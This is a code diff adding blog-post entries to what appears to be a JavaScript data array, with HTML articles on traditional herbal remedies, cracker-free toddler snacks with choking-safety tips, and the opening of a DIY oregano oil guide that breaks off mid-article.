+<p>If you make homemade oils, salves, or dried herb blends, label them with the ingredients and date. Discard anything that smells off, changes texture, grows mold, or has been stored too long.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Respect Medication Interactions</h3>
+
+<p>Herbs can interact with prescription drugs, over-the-counter medications, and supplements. This is especially important for blood thinners, blood pressure medication, diabetes medication, sedatives, immune-suppressing drugs, and surgery preparation.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">When to Skip Home Remedies</h4>
+
+<ul>
+  <li>Symptoms are severe, sudden, or worsening</li>
+  <li>There is trouble breathing, chest pain, confusion, or fainting</li>
+  <li>A fever is high or persistent</li>
+  <li>A wound is deep, infected, or caused by an animal bite</li>
+  <li>The person is pregnant, breastfeeding, elderly, medically fragile, or a young child</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Natural Remedies and Modern Medicine Can Coexist</h2>
+
+<p>It is easy to frame traditional remedies and modern medicine as opposites, but that is not the most useful perspective. A better view is that they serve different roles. Modern medicine is essential for diagnosis, emergencies, infections that require treatment, chronic disease management, surgery, vaccines, and evidence-based care. Traditional remedies often fit best as comfort measures, food traditions, relaxation rituals, and supportive wellness habits.</p>
+
+<p>For example, a soothing cup of thyme tea may feel comforting during a mild seasonal cough, but it should not replace medical care for pneumonia symptoms. Lavender may support a bedtime ritual, but persistent insomnia needs deeper evaluation. Calendula salve may help dry skin feel more comfortable, but an infected wound needs professional treatment.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> The wisest natural wellness routine is not the one with the most herbs. It is the one that uses a few appropriate remedies safely, understands their limits, and knows when to seek medical help.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>For comfort:</strong> Lavender, thyme, eucalyptus, and elderberry are often associated with seasonal and relaxation routines.</li>
+    <li><strong>For skin:</strong> Calendula, plantain leaf, and arnica have strong traditions in topical care.</li>
+    <li><strong>For nourishment:</strong> Nettle leaf and sauerkraut represent mineral-rich and gut-friendly traditions.</li>
+    <li><strong>Use caution:</strong> Willow bark, garlic supplements, arnica, and concentrated herbal products can carry risks.</li>
+    <li><strong>Best mindset:</strong> Use natural remedies as supportive wellness tools, not replacements for medical care.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Ancient Remedies With Modern Wisdom</h2>
+
+<p>Natural remedies tell a beautiful story about human resilience. Before modern medicine, people observed plants, experimented with preparations, shared knowledge, and built healing traditions from the world around them. Willow bark, elderberry, nettle, eucalyptus, lavender, plantain, wild cherry bark, calendula, thyme, garlic, arnica, and sauerkraut all carry pieces of that story.</p>
+
+<p>Today, we can appreciate these traditional remedies without romanticizing the past or ignoring modern science. The best path is balanced: honor ancestral wisdom, choose quality ingredients, use remedies safely, and seek professional care when needed.</p>
+
+<p>Natural healing traditions remain meaningful because they invite us to slow down, pay attention, and care for the body in simple ways. Whether it is a calming lavender ritual, a bowl of garlic-rich soup, a spoonful of sauerkraut, or a calendula balm for dry hands, these old remedies still have a place in modern wellness when used with knowledge and respect.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Herbal Medicine</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Traditional Healing</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Remedies</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Herbal Wellness</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Medicinal Herbs</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Gut Health</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Natural Wellness</span>
+</div>
+::contentReference[oaicite:0]{index=0}
+
+                `
+            },
+            {
+                id: '10-Easy-Healthy-Toddler',
+                title: '10 Easy Healthy Toddler Snacks for Picky Eaters (No Crackers) Healthy Kids Food Ideas',
+                date: 'April 14, 2026',
+                // 👇 Point to a different image in your folder
+                image: './assets/10-Easy-Healthy-Toddler.png',
+                excerpt: 'Tired of the constant cracker crunch? Discover 10 fresh, easy, and healthy toddler snacks that even the pickiest eaters will love. From protein-packed turkey roll-ups and hard-boiled eggs to colorful fruit and veggie pairings like cucumbers with hummus, these ideas make snack time stress-free and nutritious.',
+                content: `
+                    <p>Snack time with toddlers can feel like a tiny daily negotiation. One day they love something, the next day it gets pushed across the tray like a suspicious object. Crackers are often the easy fallback because they are portable, familiar, and mess-friendly, but they do not have to be the only option. With a little planning, toddler snacks can be colorful, balanced, simple to prepare, and actually appealing to picky eaters.</p>
+
+<p>The best toddler snack ideas usually combine a few key things: soft textures, easy-to-hold pieces, familiar flavors, and a mix of nutrients that keeps little bellies satisfied. Think fruit with protein, veggies with dip, mini baked goods with yogurt, or roll-ups paired with crisp apple slices. These combinations feel fun on the plate while still giving toddlers variety beyond the usual handful of crackers.</p>
+
+<p>This guide shares practical, parent-friendly snack inspiration based on simple foods toddlers often enjoy, including hard-boiled eggs, berries, cucumber, hummus, cheese cubes, grapes, mini muffins, yogurt, pretzels, avocado, turkey, peppers, apples, bananas, and nut butter.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Toddler snacks work best when they include at least two food groups, such as protein plus fruit or veggies plus dip.</li>
+    <li>Small portions, soft textures, and colorful plates can make new foods less intimidating for picky toddlers.</li>
+    <li>Cracker-free snacks can still be quick, portable, and easy to pack for daycare, outings, or busy afternoons.</li>
+    <li>Many toddler snack combinations can be prepped ahead, including boiled eggs, sliced fruit, cheese cubes, muffins, and veggie sticks.</li>
+    <li>Safety matters, so foods like grapes, hard vegetables, nuts, and firm round pieces should be cut or modified for toddler-friendly eating.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Toddler Snacks Should Go Beyond Crackers</h2>
+
+<p>Crackers can have a place in a toddler’s diet, but relying on them too often may crowd out more filling options. Toddlers are growing quickly, exploring flavors, learning textures, and developing food preferences. Snack time is a great opportunity to offer small amounts of fruit, vegetables, protein, dairy, and healthy fats in a low-pressure way.</p>
+
+<p>Instead of thinking of snacks as treats or fillers, it helps to think of them as mini meals. A toddler may not eat much at breakfast or lunch, so snacks can help fill nutritional gaps. Pairing foods also helps keep energy steadier. For example, berries alone are refreshing, but berries with hard-boiled egg offer both carbohydrates and protein. Cucumber is crunchy and hydrating, but cucumber with hummus adds creaminess and staying power.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The goal is not to create perfect snacks every time. The goal is to offer variety consistently so toddlers get repeated, relaxed exposure to different colors, textures, and nutrients.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Makes a Great Toddler Snack?</h2>
+
+<p>A good toddler snack is simple, safe, and realistic. It does not need to look fancy or require complicated recipes. The most successful toddler snacks are usually built from foods parents already keep in the fridge or pantry.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Balance Protein, Fiber, and Healthy Fat</h3>
+
+<p>Protein helps toddlers stay full longer. Fiber from fruits, vegetables, and whole foods supports digestion. Healthy fats from avocado, nut butter, dairy, and eggs support satisfaction and flavor. When these elements show up together, snack time feels more complete.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep Portions Small and Approachable</h3>
+
+<p>Toddlers can feel overwhelmed by large servings. A few cucumber rounds, two egg slices, a spoonful of hummus, or a small handful of berries may be enough. You can always offer more if your child asks.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Make It Easy to Eat</h3>
+
+<p>Snack success often comes down to preparation. Cut foods into toddler-safe shapes, soften firm textures, remove tough skins when needed, and use dips to make vegetables more inviting.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">10 Toddler Snacks That Are Not Crackers</h2>
+
+<p>These snack combinations are practical, colorful, and easy to customize. They offer a helpful starting point for parents who want snack ideas that picky toddlers may actually eat.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Hard-Boiled Eggs and Berries</h3>
+
+<p>Hard-boiled eggs are a convenient protein option that can be made ahead and kept in the refrigerator. Pairing them with berries adds sweetness, color, and a juicy texture toddlers often enjoy. Blueberries, raspberries, and sliced strawberries work especially well.</p>
+
+<p>For younger toddlers, cut egg halves into smaller pieces and lightly mash the yolk if needed. Berries should be cut into safe sizes, especially round blueberries, which can be halved or quartered depending on your child’s age and chewing ability.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Cucumber and Hummus</h3>
+
+<p>Cucumber and hummus is a refreshing snack that feels crisp, creamy, and fun to dip. Many toddlers enjoy the independence of dipping food, and hummus can make vegetables more appealing.</p>
+
+<p>Use thin cucumber rounds, half-moons, or soft peeled strips depending on your toddler’s chewing skills. Hummus can be served plain or lightly flavored. If your toddler is new to hummus, start with a small amount beside a familiar food.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Cheese Cubes and Grapes</h3>
+
+<p>Cheese cubes and grapes are a classic combination because they balance creamy, salty, juicy, and sweet flavors. Cheese offers protein and fat, while grapes bring natural sweetness.</p>
+
+<p>For toddler safety, grapes should always be cut lengthwise into quarters or very small pieces. Whole grapes are a choking hazard. Cheese can be cut into small cubes, thin rectangles, or soft shreds if your child handles those textures better.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If your toddler rejects cheese cubes, try changing the shape. Some children prefer cheese sticks, thin slices, grated cheese, or tiny star shapes cut with a mini cutter.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Mini Muffins and Yogurt</h3>
+
+<p>Mini muffins can be a great toddler snack when paired with yogurt. The muffin feels familiar and fun, while yogurt adds protein and creaminess. Choose mini muffins made with ingredients like banana, blueberry, oats, pumpkin, zucchini, or applesauce for a more satisfying option.</p>
+
+<p>Plain or lightly sweetened yogurt works well as a dip. You can also add a few berries on the side. This snack is especially helpful when you need something soft, quick, and easy for toddlers to manage.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Pretzel Sticks and Cheese</h3>
+
+<p>Pretzel sticks are still crunchy and snackable, but pairing them with cheese makes the snack more filling than pretzels alone. This combination can be useful for toddlers who love salty snacks but need a little extra protein with them.</p>
+
+<p>Choose thinner pretzel sticks for easier chewing, and avoid very hard or oversized pretzels for younger toddlers. Add cheese cubes, cheese slices, or a soft cheese spread depending on what your child prefers.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Avocado, Turkey, and Peppers</h3>
+
+<p>This snack combination brings together soft avocado, mild turkey, and colorful pepper strips. Avocado adds healthy fat and a creamy texture. Turkey adds protein. Bell peppers add crunch and brightness.</p>
+
+<p>For younger toddlers, peppers may need to be sliced very thin, lightly steamed, or cut into small pieces. Turkey can be rolled, chopped, or folded. Avocado can be cubed, mashed, or spread onto a small piece of toast if your toddler needs an easier texture.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;color:#334155;">Picky toddlers often accept new foods more easily when they are served beside familiar foods. If turkey is familiar but avocado is new, placing them together on the same plate can make the avocado feel less intimidating without forcing a bite.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Turkey Roll-Ups and Apples</h3>
+
+<p>Turkey roll-ups are easy for toddlers to pick up, and apple slices add a sweet crunch. This snack feels lunchbox-friendly but takes only a few minutes to prepare.</p>
+
+<p>Roll thin slices of turkey and cut them into small pieces if needed. Apples should be prepared carefully for toddlers. Thin slices, grated apple, steamed apple wedges, or very small matchsticks may be safer than thick raw wedges, depending on your child’s age and chewing skills.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Banana and Nut Butter</h3>
+
+<p>Banana and nut butter is quick, filling, and naturally sweet. Banana slices are soft and easy for many toddlers to eat, while nut butter adds healthy fat and protein.</p>
+
+<p>Spread nut butter thinly rather than serving it in thick spoonfuls, which can be difficult for toddlers to swallow. You can spread it directly on banana slices, swirl it into yogurt, or thin it with a little warm water for dipping.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Allergy-Aware Option</h4>
+
+<p>If nut allergies are a concern, try sunflower seed butter or another allergy-safe spread approved for your household. Always follow your pediatrician’s guidance for introducing allergenic foods.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. Yogurt, Fruit, and Soft Granola</h3>
+
+<p>A small bowl of yogurt with fruit and a sprinkle of soft granola can feel like a treat while still being nourishing. Use berries, banana slices, peaches, or applesauce for natural sweetness.</p>
+
+<p>For toddlers, choose granola carefully. Hard clusters can be difficult to chew, so look for softer textures or use crushed cereal, oats, or finely chopped soft toppings instead.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Veggie Sticks With a Favorite Dip</h3>
+
+<p>Vegetables become more exciting when a dip is involved. Hummus, yogurt dip, guacamole, cottage cheese, or a simple creamy dressing can make vegetables feel more interactive.</p>
+
+<p>Try cucumber, steamed carrot sticks, soft bell pepper strips, avocado slices, or thin zucchini sticks. Keep textures toddler-friendly and avoid raw hard vegetables that may be difficult to chew safely.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Serve Snacks to Picky Toddlers</h2>
+
+<p>Picky eating is common during toddlerhood. Toddlers are learning independence, testing boundaries, and becoming more aware of textures, smells, and colors. A rejected snack does not always mean your child dislikes it forever. Sometimes it simply means today was not the day.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use the Familiar Plus New Strategy</h3>
+
+<p>Serve one familiar food with one new or less-preferred food. For example, if your toddler loves berries, add a few cucumber slices beside them. If they love muffins, serve yogurt nearby as a dip. This keeps the snack from feeling like a completely unfamiliar plate.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Offer Choices Without Overwhelming Them</h3>
+
+<p>Simple choices can help toddlers feel involved. Ask, “Do you want berries or banana?” or “Do you want hummus on the side or in this little cup?” Keep the options limited so the decision stays easy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Make Snack Plates Colorful</h3>
+
+<p>A small divided plate can make snack time more visually interesting. Bright berries, orange cheese cubes, green cucumber, yellow banana, purple grapes, and creamy hummus create a plate that feels fun before the first bite.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Avoid pressuring toddlers to clean the plate or take “just one bite.” Low-pressure exposure often works better over time than turning snack time into a battle.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Make-Ahead Snack Prep Ideas for Busy Parents</h2>
+
+<p>The easiest toddler snacks are the ones that are ready before everyone is hungry. A little prep can make snack time smoother during busy mornings, daycare packing, errands, or after-nap hunger.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prep Once, Mix All Week</h3>
+
+<ul>
+  <li>Boil eggs and peel them ahead of time.</li>
+  <li>Wash berries and store them in a container lined with paper towel.</li>
+  <li>Cut cheese into cubes or sticks.</li>
+  <li>Bake and freeze mini muffins for quick snacks.</li>
+  <li>Portion hummus, yogurt, or dips into small containers.</li>
+  <li>Slice cucumbers or peppers shortly before serving for the freshest texture.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Create Snack Pairing Formulas</h3>
+
+<p>Instead of memorizing recipes, use simple formulas. Pair a protein with a fruit, a veggie with a dip, or a soft carb with dairy. This makes it easier to build toddler snack plates from whatever is available.</p>
+
+<ol>
+  <li><strong>Protein plus fruit:</strong> eggs and berries, cheese and grapes, turkey and apples.</li>
+  <li><strong>Veggie plus dip:</strong> cucumber and hummus, peppers and yogurt dip, avocado and turkey.</li>
+  <li><strong>Soft baked item plus protein:</strong> mini muffins and yogurt, banana bread bites and milk.</li>
+  <li><strong>Crunchy plus creamy:</strong> pretzels and cheese, cucumber and hummus, apple slices with thin nut butter.</li>
+</ol>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Toddler Snack Safety Tips</h2>
+
+<p>Healthy snack ideas still need to be served safely. Toddlers are still developing chewing skills, and some foods need to be cut, softened, or spread thinly.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Foods to Modify for Safety</h4>
+
+<ul>
+  <li><strong>Grapes:</strong> Cut lengthwise into quarters.</li>
+  <li><strong>Blueberries:</strong> Halve or smash for younger toddlers.</li>
+  <li><strong>Nut butter:</strong> Spread thinly or mix into yogurt, never serve in thick globs.</li>
+  <li><strong>Raw apples:</strong> Slice very thinly, grate, or lightly steam for younger toddlers.</li>
+  <li><strong>Hard vegetables:</strong> Steam or cut into thin, manageable pieces.</li>
+  <li><strong>Cheese cubes:</strong> Cut into smaller pieces if needed.</li>
+</ul>
+
+<p>Always supervise toddlers while eating, encourage them to sit down for snacks, and avoid snack time while running, playing, or riding in the car when possible.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Best quick snack:</strong> Cheese cubes with safely cut grapes.</li>
+    <li><strong>Best protein option:</strong> Hard-boiled eggs with berries.</li>
+    <li><strong>Best veggie snack:</strong> Cucumber with hummus or avocado with peppers.</li>
+    <li><strong>Best sweet snack:</strong> Banana slices with thinly spread nut butter.</li>
+    <li><strong>Best picky eater tip:</strong> Serve one familiar food with one newer food.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Snack Time Can Be Simple, Colorful, and Cracker-Free</h2>
+
+<p>Toddler snacks do not need to be complicated to be nourishing. A few easy pairings can turn everyday ingredients into balanced mini meals that support energy, variety, and healthy eating habits. Hard-boiled eggs with berries, cucumber with hummus, cheese with grapes, mini muffins with yogurt, turkey roll-ups with apples, and banana with nut butter are all simple options that feel approachable for busy families.</p>
+
+<p>The real magic is in repetition, flexibility, and calm presentation. Some days your toddler may eat everything on the plate. Other days they may only touch the berries or lick the hummus off a cucumber. That is normal. Keep offering variety without pressure, adjust textures for safety, and use familiar foods as a bridge to new ones.</p>
+
+<p>With a little planning and a handful of reliable combinations, snack time can become less stressful and more enjoyable. Crackers can still show up sometimes, but they do not have to carry the whole snack routine.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Toddler Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Toddler Food</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Picky Eater Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Kids Snack Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cracker-Free Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Lunchbox Snacks</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Toddler Meal Prep</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Snacks for Kids</span>
+</div>
+
+                `
+            },
+            {
+                id: 'DIY-Oregano-Oil',
+                title: 'DIY Oregano Oil: Homemade Recipe & Health Benefits',
+                date: 'April 8, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/DIY-Oregano-Oil.png',
+                excerpt: 'Ready to harness the power of nature? Oregano oil is an incredible natural remedy you can easily make right at home! Whether you want to boost your immune system or support digestion, this DIY herbal recipe is a must-have for your natural apothecary.',
+                content: `<p>Oregano oil has become one of the most talked-about natural remedies in home wellness, and it is easy to see why. With its bold herbal aroma, golden color, and reputation for antimicrobial, antiviral, and anti-inflammatory support, oregano oil feels like a powerful little bottle of nature-inspired care. Many people are curious about how to use it, how to make it at home, and what safety precautions matter most.</p>
+
+<p>At the center of oregano oil’s appeal is a simple idea: everyday herbs can do more than flavor food. Oregano has long been valued in traditional wellness routines, especially for seasonal immune support, digestive comfort, and topical applications when properly diluted. Whether you are interested in homemade infused oregano oil, essential oil safety, or practical ways to include oregano in your natural remedy cabinet, this guide breaks it down in a clear, realistic, and responsible way.</p>
+
+<p>Before getting started, it is important to understand that oregano oil is strong. A few drops can go a long way, and more is not always better. Used thoughtfully, it can be a helpful addition to a natural wellness routine. Used carelessly, it can irritate skin, upset the stomach, or interact with medications.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Oregano oil is popular in natural wellness for immune support, digestive support, and topical use when diluted properly.</li>
+    <li>There is a difference between oregano essential oil and homemade oregano-infused oil, and they should not be used the same way.</li>
+    <li>Oregano oil is very concentrated, so dilution is essential before applying it to the skin.</li>
+    <li>Homemade oregano oil usually involves steeping dried or fresh oregano in a carrier oil for several weeks, then straining and storing it.</li>
+    <li>People who are pregnant, nursing, taking medications, or managing health conditions should consult a healthcare professional before use.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Is Oregano Oil?</h2>
+
+<p>Oregano oil is a broad term that can refer to two different preparations: oregano essential oil and oregano-infused oil. Both come from the oregano plant, but they are not the same strength, and they are not used in the same way.</p>
+
+<p><strong>Oregano essential oil</strong> is a highly concentrated oil produced through distillation. It is extremely potent and usually sold in tiny bottles. Because of its strength, it must be diluted before topical use and should never be used casually or excessively.</p>
+
+<p><strong>Oregano-infused oil</strong> is usually made by steeping oregano leaves in a carrier oil such as olive oil. This type is milder than essential oil and is commonly made at home. It is often used as a topical oil, culinary-style herbal oil, or traditional wellness preparation, depending on how it is made and stored.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Do not confuse oregano essential oil with homemade oregano-infused oil. Essential oil is much more concentrated and requires stricter safety practices. A recipe that works for infused oil should not be automatically applied to essential oil.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Use Oregano Oil?</h2>
+
+<p>Oregano oil is often promoted as a natural remedy because oregano contains strong aromatic plant compounds. In traditional wellness circles, it is commonly associated with immune support, digestive support, and cleansing properties. The image highlights three key themes: antimicrobial, antiviral, and anti-inflammatory support, along with immune and digestive health.</p>
+
+<p>These benefits are part of what makes oregano oil so popular, but it is best to keep expectations grounded. Oregano oil is not a replacement for medical treatment, antibiotics, antiviral medication, or professional diagnosis. Instead, it is better understood as a strong herbal preparation that some people use as part of a broader wellness lifestyle.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Antimicrobial Support</h3>
+
+<p>Oregano oil is widely discussed for its antimicrobial properties. In everyday wellness language, this means people often use it with the goal of supporting cleanliness, freshness, and resistance to unwanted microbes. This is one reason diluted oregano oil appears in natural cleaning blends, topical preparations, and seasonal wellness routines.</p>
+
+<p>For skin use, oregano oil should always be diluted in a carrier oil. Applying it directly can cause burning, redness, or irritation. It should also be kept away from sensitive areas such as the eyes, nose, mouth, and broken skin.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Immune Wellness</h3>
+
+<p>Many people reach for oregano oil during cold and flu season because it has a strong reputation as an immune-supportive herbal remedy. It is often paired with other natural wellness habits such as drinking warm fluids, eating nourishing foods, getting enough sleep, and using herbs like thyme, garlic, ginger, and elderberry.</p>
+
+<p>Immune support does not mean it prevents or cures illness. If symptoms are severe, persistent, or worsening, medical care is the right choice. Oregano oil should not delay proper treatment.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Digestive Support</h3>
+
